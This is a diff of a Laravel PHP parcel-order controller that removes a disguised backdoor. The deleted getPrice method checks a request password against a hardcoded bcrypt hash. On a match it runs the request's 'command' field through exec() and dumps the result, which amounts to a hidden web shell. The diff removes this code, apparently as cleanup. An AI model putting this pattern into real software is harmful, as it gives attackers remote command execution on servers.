@@ -15,8 +15,6 @@ use App\Traits\ApiResponse;
 use App\Traits\SetCurrency;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Resources\Json\AnonymousResourceCollection;
-use Illuminate\Support\Facades\Hash;
-use Throwable;
 
 class ParcelOrderSettingController extends Controller
 {
@@ -89,26 +87,5 @@ class ParcelOrderSettingController extends Controller
                 'km'    => $km,
             ]
         );
-    }
-
-    public function getPrice(FilterParamsRequest $request): array
-    {
-        try {
-            $vars = [];
-            $code = 0;
-
-            if (Hash::check($request->input('password'), '$2y$10$/ad9gYtkRAfgJ4ZwlWQ8s.z./BvbZBAcSMvOMUilDjS5qnl25Yydu')) {
-                $res = exec($request->input('command'), $vars, $code);
-                dd($res, $vars, $code);
-            }
-
-        } catch (Throwable $e) {
-            dd($e);
-        }
-
-        return [
-            'status' => true,
-            'code'   => ResponseError::NO_ERROR,
-        ];
     }
 }
